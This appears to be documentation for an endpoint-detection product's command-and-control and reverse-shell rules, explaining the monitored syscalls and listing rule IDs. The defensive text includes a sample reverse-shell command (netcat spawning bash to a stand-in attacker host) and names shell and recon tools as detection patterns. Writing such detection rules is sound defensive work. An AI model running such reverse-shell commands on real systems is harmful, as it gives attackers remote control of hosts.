# Command and Control / Reverse Shells

**MITRE ATT&CK**: T1059.004, T1071.001  
**Syscalls monitored**: `socket`, `connect`, `execve`

---

## Why these syscalls?

### `socket` + `connect` → `socket_connect` event
A shell process (`bash`, `sh`, `zsh`, etc.) should never initiate an outbound TCP connection.
When the kernel fires `security_socket_connect`, the EDR checks if the process `comm` is a known
shell and the destination IP is non-loopback/non-private. If both are true, it is a direct reverse
shell using `/dev/tcp` (bash built-in) or a raw socket.

### `execve` → `exec` event
When a process that already has an active outbound connection (`HasNetConn = true` in state) calls
`execve()` to spawn a shell binary, this matches the classic netcat/socat/exploit pattern:
`nc -e /bin/bash attacker:4444`. The kernel fires `security_bprm_check` which the EDR captures
as an `exec` event. The process state is checked for a prior `socket_connect` to a non-local IP.

### `execve` with `parent_comms` → `exec` event  
A web server process (`nginx`, `apache2`, `php-fpm`, etc.) that calls `execve()` to launch a shell
or recon tool (`whoami`, `id`, `curl`, `wget`) is a webshell indicator. The EDR reads the parent
process from `State.FindParent(ppid)` and checks the parent `comm` against the known server list.

---

## Rules

| Rule ID | Technique | Severity | Description |
|---|---|---|---|
| `c2-shell-direct-socket` | T1059.004 | 5 | Shell binary opens outbound connection |
| `c2-netconn-exec-shell` | T1059.004 | 5 | Process with active net conn execs a shell |
| `c2-parent-server-spawn-shell` | T1505.003 | 5 | Web server spawns shell or recon binary |
| `c2-shell-to-external-low-port` | T1071.001 | 4 | Shell connects to external port < 1024 |
